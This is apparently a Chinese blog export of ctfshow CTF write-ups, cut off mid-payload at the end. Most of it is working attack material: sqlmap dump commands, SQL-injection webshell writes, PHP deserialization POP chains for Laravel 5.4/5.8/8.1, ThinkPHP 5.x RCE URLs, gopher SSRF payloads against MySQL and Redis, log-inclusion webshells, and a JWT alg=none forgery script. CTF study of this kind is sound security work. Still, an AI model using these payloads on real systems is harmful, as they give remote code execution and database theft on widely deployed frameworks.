直接定位至后端处理登陆逻辑处看看有无对参数进行校验  查看checklogin.php，首先可以看到，直接拼接的sql语句，存在SQl注入  然后接下来再看看回显。会有页面跳转，然后报错的话会回显空白{:height 272, :width 549}\n   直接上sqlmap就可以解决\nsqlmap -u http://b28e9f2c-c18c-44fe-93a5-fa21350a1acc.challenge.ctf.show/checklogin.php --dbms mysql --method=&quot;POST&quot; --data=&quot;userid=1&quot; -D sds -T sds_user -C &quot;sds_username,sds_password&quot; --dump\n还是脚本小子香啊，这自己写时间盲注调参又得调好久\n![image.png](/image_1666283095777_0.png)&#123;:height 149, :width 344&#125;\n登陆\n\nweb302. 修改的地方if(!strcasecmp(sds_decode($userpwd),$row[&#39;sds_password&#39;]))&#123;   可以看到还是上一题的那套代码   其实没太看懂这里修改的有啥用，也就是前面还是没作校验啊。换一种SQL注入思路罢了，这里就直接写SHELL   1&#x27; union select &quot;&lt;?php @assert($_POST[&#x27;t&#x27;]);?&gt;&quot; into outfile &#x27;/var/www/html/1.php&#x27; #\n   然后直接读或者蚁剑即可\nweb303.   继续分析diff，这里限制了username的长度不能超过6{:height 113, :width 329}   说明这里基本上没有注入点了，我们先观察一下其他地方   在dptadd.php中又存在insert注入，参数均可控且是拼接上去的   看下在页面上是怎么传递信息的   在dpt.php上，可以通过新增数据传递信息至dptadd.php。   然后再将查询的数据回显{:height 214, :width 496}   所以后续的SQL注入已经找到，问题又回到了怎么才能登陆进去到index.php模块上。一般在渗透上第一步都是先考虑弱口令，我们直接尝试admin/admin   之后就直接在新增功能点上进行insert注入即可   # 查库whatever&#x27;, sds_address=(database()) ## 查表whatever&#x27;, sds_address=(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;sds&#x27;) ## 查字段whatever&#x27;, sds_address=(select group_concat(column_name) from information_schema.columns where table_name=&#x27;sds_fl9g&#x27;) ## 查值whatever&#x27;, sds_address=(select group_concat(flag) from sds_fl9g) #\nweb304. 增加了全局WAF   function sds_waf($str)&#123;\treturn preg_match(&#x27;/[0-9]|[a-z]|-/i&#x27;, $str);&#125;\n   同上\nweb305.   这回来真的WAF了   常用特殊符号都跟我ban了所以基本没戏   多了一个class.php，来分析一下class user&#123;\tpublic $username;\tpublic $password;\tpublic function __construct($u,$p)&#123;\t\t$this-&gt;username=$u;\t\t$this-&gt;password=$p;\t&#125;\tpublic function __destruct()&#123;\t\tfile_put_contents($this-&gt;username, $this-&gt;password);\t&#125;&#125;\n   很简单的php反序列化，可以写shell，看看触发点   位于登陆检测点checklogin.php，通过cookie传入{:height 142, :width 448}   那就直接利用即可   &lt;?phpclass User &#123;    public $username;    public $password;    public function __construct()    &#123;        $this -&gt;username = &quot;/var/www/html/1.php&quot;;        $this -&gt;password = &#x27;&lt;?php @eval($_POST[&quot;attack&quot;]); ?&gt;&#x27;;    &#125;&#125;echo urlencode(serialize(new User()));\n   发现并不在网站上，可能还是在数据库里，用蚁剑连一下   数据库配置如下{:height 134, :width 577}   md，被搞了数据库密码竟然是root\nweb306. 开始使用mvc结构   作者真的循循善诱，用同一套代码不断升级   可以看到多了三个文件config.php/dao.php/service.php   整个代码确实用mvc结构建立起来了，但是反序列化点还在   关注class.php\n{:height 279, :width 400}\n这里依然可反序列化写文件，但是需要其他类触发close\n然后会发现在`dao.php`中dao类是可以调用成员对象的close方法，其对象可控\n![image.png](/image_1666353099474_0.png)&#123;:height 308, :width 273&#125;\n而触发点这次可以看到`index.php`导入了`service.php`，后者又导入了`dao.php/fun.php`，而dao.php导入了`class.php`，所以可以触发反序列化\n&lt;?phpclass log &#123;    public $title;    public $info;    public function __construct() &#123;        $this-&gt;title = &quot;/var/www/html/1.php&quot;;        $this-&gt;info = &#x27;&lt;?php @eval($_POST[&quot;attack&quot;]) ?&gt;&#x27;;    &#125;&#125;class dao &#123;    private $config;    private $conn;    public function __construct() &#123;        $this-&gt;conn = new log();    &#125;&#125;echo base64_encode(serialize(new dao()));\n所以需要先登陆进去即可触发，依然是弱口令`admin/admin1`\n\nweb307. 是不是顺眼多了   这次连目录结构都规划完整了   首先还是去看我们的sink点，可以看到函数名换成了closelog，而没有类成员再调用它了，只能换换看   找一下可以看到还有一个代码执行的sink点，位于dao.php中，config成员属性可控{:height 80, :width 633}   看看哪里可以调用clearCache   service.php下service类{:height 105, :width 415}   而该类又在logout.php下可以触发{:height 118, :width 658}   POP链已出   这里刚开始多写了一步导致出不来了，也就是我是拿service.php来作为反序列化起点的，但是仔细会发现，其在触发反序列化后，会重新初始化成员变量，那么之前的构造就断了，所以肯定不能从这类作起点，所以往后走一个从dao开始，也没啥影响（触发的函数名相同）{:height 165, :width 425}   &lt;?phpclass config &#123;    private $cache_dir;    public function __construct() &#123;      // 这里需要注意shell中$为变量符号所以需要转义        $this-&gt;cache_dir = &#x27;; echo &quot;&lt;?php eval(\\$_POST[1]);?&gt;&quot; &gt; 1.php ;&#x27;;    &#125;&#125;class dao &#123;    private $config;    public function __construct() &#123;        $this-&gt;config = new config();    &#125;&#125;echo base64_encode(serialize(new dao()));\nweb308. 需要拿shell   查看上一题的漏洞sink点，可以看到多了过滤，只能存在字母   但是仔细观察会发现在fun.php中的checkUpdate函数存在SSRF，对url并无过滤   我们是知道内网开了mysql服务，查看配置发现没设密码，典型的未授权访问，直接打getshell   利用gopher打mysql   触发点在index.php中   &lt;?phpclass config &#123;    public $update_url;    public function __construct() &#123;        $this-&gt;update_url = &quot;gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%48%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%20%3f%3e%27%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%27%3b%01%00%00%00%01&quot;;    &#125;&#125;class dao &#123;    private $config;    public function __construct() &#123;        $this-&gt;config = new config();    &#125;&#125;echo base64_encode(serialize(new dao()));\n   前台登陆还是弱口令，然后cookie传入，连蚁剑，麻了我就说为啥这么卡，一看节点是美国的\nweb309.  需要拿shell，308的方法不行了,mysql 有密码了   我的思路也是应该还有其他开放的服务，看看还有没有啥未授权   通过 gopher 协议的延时可以探测端口是否开放，开放的端口会保持连接，而未开放的端口会直接返回页面结果，经探测后 9000端口开放，基本可以确定是 fastcgi{:height 387, :width 671}\nweb310. 代码审计告一段落   这题就算是积累经验吧，没尝试再去访问9000，因为看了wp说关了(后面看配置其实没关啊，其实是flag换了个位置而已)。这里换一个思路，服务器中间件为nginx，所以尝试去读一下其配置文件看看，绝对路径为/etc/nginx/nginx.conf   https://deepzz.com/post/how-to-write-nginx-server.html   # worker进程个数，一般为 CPU 个数，也可选 autoworker_processes  auto;# 错误日志保存路径和级别error_log  /var/log/nginx/error.log warn;events &#123;  # 每个worker最大连接数    worker_connections  1024;&#125;# http 服务定义http &#123;  # 加载 mime 类型    include       /etc/nginx/mime.types;  # 定义默认数据类型    default_type  application/octet-stream;  # 是否调用sendfile函数（zero copy 方式）来输出文件，如果磁盘IO重负载应用，可设置为off    sendfile        on;    keepalive_timeout  65;    server &#123;        listen       80;  # 监听端口        server_name  localhost;        root         /var/www/html;        index index.php;        proxy_set_header Host $host;        proxy_set_header X-Real-IP $remote_addr;        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\t\t    // 根据 URI 进行配置设置的        location / &#123;            try_files $uri  $uri/ /index.php?$args;        &#125;\t// ～ 区分大小写的正则表达式匹配        location ~ \\.php$ &#123;            try_files $uri =404;            fastcgi_pass   127.0.0.1:9000;            fastcgi_index  index.php;            include        fastcgi_params;            fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;        &#125;    &#125;\tserver &#123;        listen       4476;        server_name  localhost;        root         /var/flag;        index index.html;        proxy_set_header Host $host;        proxy_set_header X-Real-IP $remote_addr;        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;    &#125;&#125;\n   会发现其在4476端口还有个旁站，并且对应的目录及其特别，我们尝试访问（不过只能ssrf访问），应该是有ip限制\n\n","tags":["ctfshow"]},{"title":"CTFSHOW-框架复现","url":"/2022/11/29/ctfshow-%E6%A1%86%E6%9E%B6%E5%A4%8D%E7%8E%B0/","content":"\nweb466-470 Laravel5.4版本 ，提交数据需要base64编码\n参考自https://xz.aliyun.com/t/11002、\nPOP链1-failed\n\nsource点\nsrc/Illuminate/Broadcasting/PendingBroadcast.php#__destruct() ，events属性可控，所以可以利用一个拥有dispatch方法或者__call方法的类传入对象参数event同样可控\n\n这里利用到了src/Faker/Generator.php#__call()，其中method为dispatch，attributes参数为event（可控），继续跟进\n\n可以看到里面有一个call_user_func_array()，这里首先arguments根据函数要求需要是一个array类型的对象，我们可以构造。之后再看第一个参数又调用了getFormatter方法\n\nformatters可控，所以直接构造一个键值对即可\n\n\n\n但是实际上由于反序列化会触发到该类的__wake()方法，formatters数组直接给我清空了\n\npop链2\n换一个__call方法，这里利用到了Illuminate/Support/Manager.php\nmethod为dispatch，parameters可控，其中又调用了driver方法\n\n这里driver我们没法控制，所以会调用getDefaultDriver方法，后者是一个抽象方法，需要类进行重写，我们先放着。drivers数组是可控的，当没有存在对应键值对时会调用createDriver()\n\n这里的customCreators看起来也是可控的，跟入callCustomCreator\n\n\n\n这里存在一个动态函数RCE，customCreators数组可以构造键值对，参数app可控\n\n所以这里的关键就是这个driver变量可以通过getDefaultDriver返回一个可控值，这里在它的继承类里去找\n在ChannelManager#getDefaultDriver()中，返回值可控\n\npoc:\n&lt;?phpnamespace Illuminate\\Notifications &#123;    class ChannelManager &#123;        protected $app;        protected $defaultChannel;        protected $customCreators;        public function __construct() &#123;            $this-&gt;defaultChannel = &quot;xxx&quot;;            $this-&gt;customCreators = [                &quot;xxx&quot; =&gt; &quot;system&quot;            ];            $this-&gt;app = &quot;calc&quot;;        &#125;    &#125;&#125;namespace Illuminate\\Broadcasting &#123;    use Illuminate\\Notifications\\ChannelManager;    class PendingBroadcast &#123;        protected $events;        protected $event;        public function __construct() &#123;            $this-&gt;events = new ChannelManager();            $this-&gt;event = &quot;whatever&quot;;        &#125;    &#125;&#125;namespace &#123;    use Illuminate\\Broadcasting\\PendingBroadcast;    $exp = new PendingBroadcast();    echo base64_encode(serialize($exp));&#125;\nLaveral 提交数据的方式\n/xxx/&lt;base64_data&gt;\npop链3：\n继续寻找新的可利用__call方法类\nIlluminate/Validation/Validator.php#_call，这里的rule变量不可控，method为patch，而parameters可控，先往后看，跟进    \n在callExtension方法中，extensions数组可控，之后会调用call_user_func_array可能导致RCE。所以关键就是rule变量是否可控或者是个常数\n\n我们跟进Str::snake()方法，参数经过了一个字符串截取，由于method为dispatch，截取之后为空字符串，所以可以看到中间并无任何影响，返回仍为空\n\npoc\n&lt;?phpnamespace Illuminate\\Validation &#123;    class Validator &#123;        public $extensions;        public function __construct() &#123;            $this-&gt;extensions = [                &quot;&quot; =&gt; &quot;system&quot;            ];        &#125;    &#125;&#125;namespace Illuminate\\Broadcasting &#123;    use Illuminate\\Validation\\Validator;    class PendingBroadcast &#123;        protected $events;        protected $event;        public function __construct() &#123;            $this-&gt;events = new Validator();            $this-&gt;event = &quot;calc&quot;;        &#125;    &#125;&#125;namespace  &#123;    use Illuminate\\Broadcasting\\PendingBroadcast;    $exp = new PendingBroadcast();    echo base64_encode(serialize($exp));&#125;\npop链4\n这次去寻找带dispatch方法的利用类\nIlluminate/Events/Dispatcher.php#dispatch，这里存在一个动态函数调用，先看看前面变量的赋值变化\n\n跟进parseEventAndPayload(),payload参数并不可控。由于我们控制event是方法的参数，因此其不是个object类对象，将会返回本身。这里还需要注意的是对于foreach结构，我们需要让这个getListeners函数返回值是一个迭代数组\n\n再看看listener变量是咋来的，跟进getListener方法。这里listeners数组和eventName均可控，由于我们要利用listener值作为动态函数调用，所以其不可能是个类名（比如利用system），因此返回值就是listeners本身\n\n同时注意到system函数是可以支持接收两个参数的\n\npoc:\n&lt;?phpnamespace Illuminate\\Events &#123;    class Dispatcher &#123;        protected $listeners;        public function __construct() &#123;            $this-&gt;listeners = [                &quot;calc&quot; =&gt; [&quot;system&quot;]            ];        &#125;    &#125;&#125;namespace Illuminate\\Broadcasting &#123;    use Illuminate\\Events\\Dispatcher;    class PendingBroadcast &#123;        protected $events;        protected $event;        public function __construct() &#123;            $this-&gt;events = new Dispatcher();            $this-&gt;event = &quot;calc&quot;;        &#125;    &#125;&#125;namespace &#123;    use Illuminate\\Broadcasting\\PendingBroadcast;    $exp = new PendingBroadcast();    echo base64_encode(serialize($exp));&#125;\npop链5：\n位于ValidGenerator#call()，这里对于第一个call_user_func_array()传入的第一个参数为数组，也就是会调用generator变量的name方法，这里name为dispatch不可控，而generator以及后面的maxRetries和validator变量均可控。所以我们想想利用后面的call_user_func，前面去寻找一个能够调用返回可控值的__call方法的对象\n\n于是找到DefaultGenerator.php，这里default可控\n\n&lt;?phpnamespace Faker &#123;    class DefaultGenerator &#123;        protected $default;        public function __construct() &#123;            $this-&gt;default = &quot;calc&quot;;        &#125;    &#125;    class ValidGenerator &#123;        protected $generator;        protected $validator;        protected $maxRetries;        public function __construct() &#123;            $this-&gt;validator = &quot;system&quot;;            $this-&gt;maxRetries = 10000000;            $this-&gt;generator = new DefaultGenerator();        &#125;    &#125;&#125;namespace Illuminate\\Broadcasting &#123;    use Faker\\ValidGenerator;    class PendingBroadcast &#123;        protected $events;        protected $event;        public function __construct() &#123;            $this-&gt;events = new ValidGenerator();            $this-&gt;event = &quot;cat /flag&quot;;        &#125;    &#125;&#125;namespace &#123;    use Illuminate\\Broadcasting\\PendingBroadcast;    $exp = new PendingBroadcast();    echo base64_encode(serialize($exp));&#125;\n\nLaravel5.8版本 提交数据需要base64编码\n前面的source点不变，定位利用类到Dispatcher#dispatch()，我们的目标是进入dispatchToQueue()方法\n\n\n\n因为其中存在call_user_func()，参数connection为command变量的属性，待寻找\n\n要想进入该方法，三元表达式条件1：queueResolver变量是可控的且是我们后面构造的调用函数；条件2：还要进入commandShouldBeQueued()方法\n可以看到我们的参数变量command需要满足实现ShouldQueue类接口\n\n找到一个QueuedCommand类，这样的话connection变量我们也可以通过它来构造\n对于最终sink类，我们用的是EvalLoader的load方法，里面存在eval函数。\n\n看下definition(MockDefinition类，可用connction构造)的getCode()\n\n这里还有一点注意的就是要绕过一下前面的判断句definition-&gt;getClassName()方法，其需要返回一个不是类名的字符串（也不能是NULL）\n这里找一个常量类Line\n\nPOC\n&lt;?phpnamespace PhpParser\\Node\\Scalar\\MagicConst &#123;    class Line &#123;    &#125;&#125;namespace Mockery\\Generator &#123;    use PhpParser\\Node\\Scalar\\MagicConst\\Line;    class MockDefinition &#123;        protected $code;        protected $config;        public function __construct() &#123;            $this-&gt;config = new Line();            $this-&gt;code = &quot;&lt;?php phpinfo(); ?&gt;&quot;;        &#125;    &#125;&#125;namespace Mockery\\Loader &#123;    class EvalLoader &#123;    &#125;&#125;namespace Illuminate\\Foundation\\Console &#123;    use Mockery\\Generator\\MockDefinition;    class QueuedCommand &#123;        public $connection;        public function __construct() &#123;            $this-&gt;connection = new MockDefinition();        &#125;    &#125;&#125;namespace Illuminate\\Bus &#123;    use Mockery\\Loader\\EvalLoader;    class Dispatcher &#123;        protected $queueResolver;        public function __construct() &#123;            $this-&gt;queueResolver = array(new EvalLoader(), &quot;load&quot;);        &#125;    &#125;&#125;namespace Illuminate\\Broadcasting &#123;    use Illuminate\\Bus\\Dispatcher;    use Illuminate\\Foundation\\Console\\QueuedCommand;    class PendingBroadcast &#123;        protected $event;        protected $events;        public function __construct() &#123;            $this-&gt;events = new Dispatcher();            $this-&gt;event = new QueuedCommand();        &#125;    &#125;&#125;namespace &#123;    use Illuminate\\Broadcasting\\PendingBroadcast;    $exp = new PendingBroadcast();    echo base64_encode(serialize($exp));&#125;\n\nLaravel8.1版本 提交数据需要base64编码\n\nsource点不变，与Laravel5.5的其实很类似，还是定位在利用类Dispatcher#dispatchToQueue()上，这里可以直接rce的\n\npoc:\n&lt;?phpnamespace Illuminate\\Foundation\\Console &#123;    class QueuedCommand &#123;        public $connection;        public function __construct() &#123;            $this-&gt;connection = &quot;calc&quot;;        &#125;    &#125;&#125;namespace Illuminate\\Bus &#123;    class Dispatcher &#123;        protected $queueResolver;        public function __construct() &#123;            $this-&gt;queueResolver = &quot;system&quot;;        &#125;    &#125;&#125;namespace Illuminate\\Broadcasting &#123;    use Illuminate\\Bus\\Dispatcher;    use Illuminate\\Foundation\\Console\\QueuedCommand;    class PendingBroadcast &#123;        protected $event;        protected $events;        public function __construct() &#123;            $this-&gt;events = new Dispatcher();            $this-&gt;event = new QueuedCommand();        &#125;    &#125;&#125;namespace &#123;    use Illuminate\\Broadcasting\\PendingBroadcast;    $exp = new PendingBroadcast();    echo base64_encode(serialize($exp));&#125;\n\nweb473 thinkphp 5.0.15\n题目给了点提示\npublic function inject()&#123;     $a=request()-&gt;get(&#x27;a/a&#x27;);     db(&#x27;users&#x27;)-&gt;insert([&#x27;username&#x27;=&gt;$a]);     return &#x27;done&#x27;;        &#125;\n参考：https://www.cnblogs.com/litlife/p/11273652.html\npayload：(跟上前面的路由)\nindex.php?s=index/index/inject&amp;a[0]=inc&amp;a[1]=updatexml(1,concat(0x7e,user(),0x7e),1)&amp;a[2]=1\n这里updatexml报错失败，使用exp报错注入\nindex.php?s=index/index/inject&amp;a[0]=inc&amp;a[1]=exp(~(select * from (select version())x))&amp;a[2]=1\n\n这里选择直接读文件\nindex.php?s=index/index/inject&amp;a[0]=inc&amp;a[1]=exp(~(select * from (select load_file(&#x27;/flag&#x27;))x))&amp;a[2]=1\n\nweb474 \n题目给了点提示\nthinkphp5.0.5默认控制器的部分代码，使用默认路由： public function rce()&#123;        Cache::set(&quot;cache&quot;,input(&#x27;get.cache&#x27;));        return &#x27;done&#x27;;    &#125;\n参考链接：https://blog.csdn.net/rfrder/article/details/114599310\n题目环境的路由为\npublic/index.php?s=index/index/rce\npayload:\npublic/index.php?s=index/index/rce&amp;cache=%0d%0asystem(&#x27;cat /flag&#x27;);//\n猜测name值为cache，按照规则计算文件名，访问即可\nruntime/cache/0f/ea6a13c52b4d4725368f24b045ca84.php\n\nweb475 ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析\n梳理\n\n$this-&gt;method可控导致可以调用__contruct()覆盖Request类的filter字段，然后App::run()执行判断debug来决定是否执行$request-&gt;param()，并且还有$dispatch[‘type’] 等于controller或者 method 时会执行$request-&gt;param()，而$request-&gt;param()会进入到input()方法，在这个方法中将被覆盖的filter回调call_user_func()，造成rce\n\npoc:\npublic/index.php?s=captchaPOST:_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami\nApp.php#run()程序的开始，调用self::routeCheck()检测路由\n\n\n\n其中会进一步调用Route::check()根据route.php中的路由配置进行检测\n\n里面存在一个关键函数调用strtolower($request-&gt;method())，跟进后面\n\n其中存在动态函数调用，var_method对应参数值为_method。\n\n因此当POST传参_method时，就会进入该if条件分支，并执行$this-&gt;&#123;this-&gt;method&#125;($_POST)\n\n因此这里我们可以调用该类的任意方法，参数为POST数组。我们利用构造函数__construct()(方法名与大小写无关)\n\n在构造方法中，会对该类中的成员属性变量进行覆盖\n\n覆盖结果如下\n$this    method = &quot;get&quot;    get = &#123;array&#125; [0]        0 = whoami    filter =  &#123;array&#125; [0]        0 = system\n这里给method变量赋值get的原因是我们的路由会检测到captcha注册时用的get方法，这样才不会出错\n\n之后返回后执行self::exec()，跟入\n\n由于dispatch变量的type值为method，所以会进入switch对应分支。这里会利用array_merge()方法合并参数，由于我们之前设置了get参数为数组[&#39;whoami&#39;]，因此作用之后传给了param数组\n\n\n跟入input方法\n\n里面存在解析过滤器，getFilter()\n\n注意到我们之前覆盖变量已经将filter成员变量写成了[&#39;system&#39;]，所以最终会将其返回\n\n回到input函数，由于data我们之前传递的param变量数组，因此会来到array_walk_recursive()\n\n该函数的作用是会为data数组中的每一个元素调用filterValue方法，每一个元素会作为第一个参数（类似python中的map函数）\n最终看到了sink函数call_user_func()，filter即为我们的数组成员system\n\npoc2：\n回到刚才流程中的param()方法\n\n跟进method(true)，会进一步调用server方法\n\n会发现这里还是会调用input方法，这里的server就是之前会被当做参数循环执行filterValue方法的data数组\n\n因此我们只需要将server[REQUEST_METHOD]设置为whoami其他保持不变即可照样RCE。注意细节，name是REQUEST_METHOD，所以数组中必须得包含这个键\n\npublic/index.php?s=captcha_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami\n\nweb476 thinkphp  5.0.0-5.0.23 rce\n参考 https://blog.riskivy.com/thinkphp5-x%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/\npoc：\npublic/index.php?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=C:\\WINDOWS\\System32\\calc.exe\n首先在Route.php中经过url解析得到模块名 控制器名和方法名\n\n之后获取到路由信息后还是一样进入self::exec()进行调用分发\n\n\n\n注意到这里dispatch的type变成了module，因此switch到对应语句，执行module方法，继续跟入\n\n在其中会获取到相应解析好的模块名、控制器名以及操作名，\n\n接着会设置请求的控制器，跟进controller方法\n\n其中会获取模块名以及类名\n\n这里看一下getModuleAndClass方法，对于name如果其中包含反斜线则会直接作为class名返回，这里也就是\\think\\app\n\n之后调用invokeClass()方法，利用反射构造对应的Controller类实例\n回到module函数，这里会利用反射获取Controller对象的方法也就是invokeFunction\n\n最后会通过invokeMethod()反射触发invokeFunction()\n\n而在invokeFunction()中是可以反射调用任意方法function的，可以看到反射获得了我们传的call_user_func_array()，并获取参数vars\n\nvars即我们传递的参数。最终调用$reflect-&gt;invokeArgs($args);触发\n\n","tags":["ctfshow"]},{"title":"CTFSHOW-黑盒测试","url":"/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/","content":"\nweb380 黑盒测试\n字典里扩充了一下hhh，一开始扫不出来\n\n存在page.php，访问查看\n\n可以看到有一个未定义的变量id，尝试直接读flag\n\nweb381 \n在源码中link标签处css引用存在另一后台的url\n\n直接访问\n\nweb382\n这次我们继续访问可疑地址，变成了一个登录框\n万能密码就登录进去了\n\n\nweb383\n同理\n\nweb384 密码前2位是小写字母，后三位是数字\n这关没有sql注入漏洞了，但提示应该是存在弱口令，直接按规则爆破\n有点难，最后密码是xy123\n\nweb385\n这关其实也算是目录扫描吧，扫出install安装目录，其可以重置默认密码\n\n\n\nweb386 \n再次访问install，会发现存在lock.dat\n\nFUZZ一下php文件名，多了一个clear.php\n\n\n\n访问clear.php/?file=./install/lock.dat即可清理掉lock.dat\n之后再去访问/install?install即可重置密码，然后重新弱密码登录即可\n\nweb386. 前面部分和386一样\n这题已经没法去删掉lock.dat文件了，再扫扫目录\n\n\n\n先看看robots.txt，可以去访问debug目录，拼接参数试试\n\n发现可以读出/etc/passwd，因此可以判断，这个目录下文件提供一个文件包含的操作。由于该站点的中间件为nginx，所以尝试日志包含。/var/log/nginx/access.log，确实可以，那么尝试写马\n\n直接写马失败，按照上题思路，我们可以手动删除lock.dat文件，尝试写入\n&lt;?php unlink(&#x27;/var/www/html/install/lock.dat&#x27;); ?&gt;\n\n之后按照上题来就行\n\nweb387\n按照上一题的思路来，会发现已经无回显\n\n\n\n这次我们基于/alsckdfy目录去扫一下存在什么文件\n\n有个编辑器看看能否利用，访问可知是一个KindEditor编辑器，找找版本 4.1.11\n\n找下有无可利用的漏洞，https://www.hacking8.com/bug-editor/Kindeditor/CVE-2017-1002024-Kindeditor-_=4.1.11-%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html\n\n也就是说，我们这里可以上传txt,html一类文件，且上传后的文件路径可知/alsckdfy/attached/file/ . 这里的话我们可以配合之前的日志包含，将一段php恶意代码通过日志文件来执行\n首先，上传恶意代码\n&lt;?php \t$a = &#x27;&lt;?ph&#x27;.&#x27;p ev&#x27;.&#x27;al($_PO&#x27;.&#x27;ST[1]);?&gt;&#x27;;\tfile_put_contents(&#x27;/var/www/html/1.php&#x27;, $a);?&gt;\n访问该文件验证上传成功\n\n接下来访问/debug?file=xxx，来将恶意代码写入日志文件\n/debug/?file=/var/www/html/alsckdfy/attached/file/20221116/20221116035705_82067.txt\n然后包含日志文件进来，使得恶意代码被解析执行\n/debug/?file=/var/log/nginx/access.log\n\n\nweb389\n直接访问/debug，会回显权限不足\n看看cookie，存在auth键值对\nauth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY2ODYwNzU4NywiZXhwIjoxNjY4NjE0Nzg3LCJuYmYiOjE2Njg2MDc1ODcsInN1YiI6InVzZXIiLCJqdGkiOiI3MTI0N2E3ZDMxOWE1MmMzZjM3YmE3OTA5MGM1N2FkZCJ9.jxCUL0trBNZNdp_fXROsID50HaOnAs37mEbBWuUhnJk\n很明显是一个jwt鉴权，我们解码一下看看字段\n\n尝试直接进行空加密\nimport jwtpayload = &#123;    &quot;iss&quot;: &quot;admin&quot;,    &quot;iat&quot;: 1668607587,    &quot;exp&quot;: 1668614787,    &quot;nbf&quot;: 1668607587,    &quot;sub&quot;: &quot;admin&quot;,    &quot;jti&quot;: &quot;71247a7d319a52c3f37ba79090c57add&quot;&#125;header = &#123;    &quot;alg&quot;: &quot;none&quot;,    &quot;typ&quot;: &quot;JWT&quot;&#125;token = jwt.encode(payload, key=&quot;&quot;, algorithm=&quot;none&quot;, headers=header)print(token)\n接下来按照上一题流程即可\n\n\n\n\nweb390\n关注url出现了参数\n\n关注回显长度的变化，正常参数时\n\n当加入特殊字符时\n\n由此可知存在盲注，直接sqlmap一把梭\nsqlmap -u xxx --os-shell\n\n\nweb391-392\n测一下/search.php?id=会发现也存在sql注入\n\n\n\n\n\nweb393\ntitle处的参数仍然存在时间回显不一致的问题（比较隐蔽），可以利用盲注。同时关注到底下多了一个搜索引擎\n\n关注一下url\n\n\n\n这里讲述另外一种利用方式，先基本查一下库中数据\nsqlmap -u &quot;http://836b34a4-5a85-46c1-ae8a-c68874d0c7e8.challenge.ctf.show/search.php?title=1&quot; --dbs# ctfshow sqlmap -u &quot;http://836b34a4-5a85-46c1-ae8a-c68874d0c7e8.challenge.ctf.show/search.php?title=1&quot; -D ctfshow --tables# admin_user content linksqlmap -u &quot;http://836b34a4-5a85-46c1-ae8a-c68874d0c7e8.challenge.ctf.show/search.php?title=1&quot; -D ctfshow -T link --columns# id name url(varchar)\n因此结合回显，我们可以修改id对应的url值，利用file协议将本地文件回显出来\npayload: \n&#x27;; update link set url=&#x27;file:///flag&#x27; where id=4; %23\n\nweb394 FLAG_NOT_HERE\ntitle字段仍然存在时间回显问题，所以可以继续时间盲注。我们依然可以用上一题的思路通过修改Url的值来回显flag，需要注意的是，这次参数存在关键词过滤，因此需要通过编码绕过\n&#x27;; update link set url=0x66696c653a2f2f2f666c6167; %23\n\n发现flag不在根目录了，那就还在/var/www/html/alsckdfy/check.php中\n&#x27;; update link set url=0x66696c653a2f2f2f7661722f7777772f68746d6c2f616c73636b6466792f636865636b2e706870; %23\n原来在源代码里，差点被骗了。。。\n\n\nweb395 FLAG_NOT_HERE\n这里学习一种新的思路，注入位置未变，我们可以利用未授权的redis进行getshell\n也就是说，这里利用的是修改url的值为gopher协议，去打redis\n我们首先要解决的问题是url字段长度问题，由前面几题知道该字段结构为varchar(255),\n因此先修改字段类型为text\n&#x27;; alter table link modify column url text; %23\n接着生成gopher的payload\n\n\n\ngopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2430%0D%0A%0A%0A%3C%3Fphp%20%40eval%28%24_POST%5B1%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A\n然后将其插入到link表的insert字段当中\n&#x27;; insert into link values(10,&quot;a&quot;, 